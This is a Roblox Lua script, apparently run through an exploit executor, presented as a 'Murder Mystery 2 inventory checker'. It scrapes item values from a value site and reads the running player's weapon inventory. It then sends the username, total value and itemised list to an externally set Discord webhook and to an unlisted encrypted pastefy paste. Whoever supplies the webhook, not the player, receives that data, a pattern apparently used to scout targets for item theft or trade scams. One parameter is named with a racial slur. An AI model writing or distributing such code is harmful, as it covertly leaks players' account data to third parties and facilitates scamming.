if not game:IsLoaded() then game.Loaded:Wait() end
if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("Game not supported. Please join a normal Murder Mystery 2 server")
end
_G.scriptExecuted = _G.scriptExecuted or false
--[[if _G.scriptExecuted then
    return
end]]
_G.scriptExecuted = true
hhdhd = {}
table.insert(hhdhd,math.random(1,16777215))
 min_rarity1 = min_rarity
 min_value1 = min_value
 webhook1 = webhook
local weaponsToSend = {}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync")).Weapons
local HttpService = game:GetService("HttpService")

local rarityTable = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Vintage",
    "Godly",
    "Ancient",
    "Unique"
}

local categories = {
    godly = "https://supremevalues.com/mm2/godlies",
    ancient = "https://supremevalues.com/mm2/ancients",
    unique = "https://supremevalues.com/mm2/uniques",
    classic = "https://supremevalues.com/mm2/vintages",
    chroma = "https://supremevalues.com/mm2/chromas"
}
local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local response = request({
        Url = url,
        Method = "GET",
        Headers = headers
    })
    return response.Body
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then
            return value
        end
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local itemNameLower = itemName:lower()

            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemNameLower] = value
            end
        end
    end
    
    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}

    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end
    
    return chromaValues
end

local function buildValueList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}

    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extractedItemValues = extractItems(htmlContent)
                    for itemName, value in pairs(extractedItemValues) do
                        allExtractedValues[itemName] = value
                    end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end

            completed = completed + 1
            if completed == totalCategories then
                lock:Fire()
            end
        end)
    end

    lock.Event:Wait()

    local valueList = {}

    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false

        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")

            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                if hasChroma then
                    local matchedChromaValue = nil
                    for chromaName, value in pairs(chromaExtractedValues) do
                        if chromaName:find(itemName) then
                            matchedChromaValue = value
                            break
                        end
                    end

                    if matchedChromaValue then
                        valueList[dataid] = matchedChromaValue
                    end
                else
                    local value = allExtractedValues[itemName]
                    if value then
                        valueList[dataid] = value
                    end
                end
            end
        end
    end

    return valueList
end

local totalValue = 0

local function SendFirstMessage(list,niga)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "All Items:",
            value = niga,
            inline = false
        },
    }

    for _, item in ipairs(list) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.Chroma..item.RealName, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\n Plus more"
        end
    end

    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 MM2 Inventory Checker",
            ["color"] = hhdhd[1],
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "MM2 Inventory Checker by amaz. https://discord.gg/UgNvdnytt7"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook1,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end


local untrad = {
    ["DefaultGun"] = true,
    ["DefaultKnife"] = true,
    ["Reaver"] = true,
    ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true,
    ["Reaver_Ancient"] = true,
    ["IceHammer"] = true,
    ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true,
    ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true,
    ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true,
    ["Season1TestKnife"] = true,
    ["Cracks"] = true,
    ["Icecrusher"] = true,
    ["???"] = true,
    ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true,
    ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true,
    ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true,
    ["SharkSeeker"] = true
}


local valueList = buildValueList()
local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

for i, v in pairs(realData.Weapons.Owned) do
    local minraritysort = table.find(rarityTable, min_rarity1)
    local dataid = i
    local amount = v
    local rarity = database[dataid].Rarity
    local weaponraritysort = table.find(rarityTable, rarity)
    if weaponraritysort and weaponraritysort >= minraritysort and not untrad[dataid] then
        local value
        if valueList[dataid] then
            value = valueList[dataid]
        else
            if weaponraritysort >= table.find(rarityTable, "Godly") then
                value = 2
            else
                value = 1
            end
        end
        if value >= min_value1 then
            totalValue = totalValue + (value * amount)
            if database[dataid].Chroma == true then
                table.insert(weaponsToSend, {Chroma = "Chroma ",RealName = database[dataid].ItemName ,DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
            else
                table.insert(weaponsToSend, {Chroma = "",RealName = database[dataid].ItemName ,DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
            end
        end
    end
end

--if #weaponsToSend > 0 then
    table.sort(weaponsToSend, function(a, b)
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)

    local sentWeapons = {}
    for i, v in ipairs(weaponsToSend) do
        sentWeapons[i] = v
    end
    dididi = {}
    for _, item in ipairs(weaponsToSend) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.Chroma .. item.RealName, item.Amount, (item.Value * item.Amount), item.Rarity)
        table.insert(dididi,itemLine)
    end
    function dadadd()
        dadasd = request({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                type = "PASTE",
                title = "MM2 inv check",
                encrypted = true,
                content = table.concat(dididi,"\n"),
                visibility = "UNLISTED",
            }),
        })
        local pasteUrl1 = dadasd.Body
        local rawUrl1 = "https://pastefy.app/"..pasteUrl1:match('%"id":"(%w+)').."/raw"
        return rawUrl1
    end
    --setclipboard(table.concat(dididi,"\n"))
    SendFirstMessage(weaponsToSend,dadadd())
--end
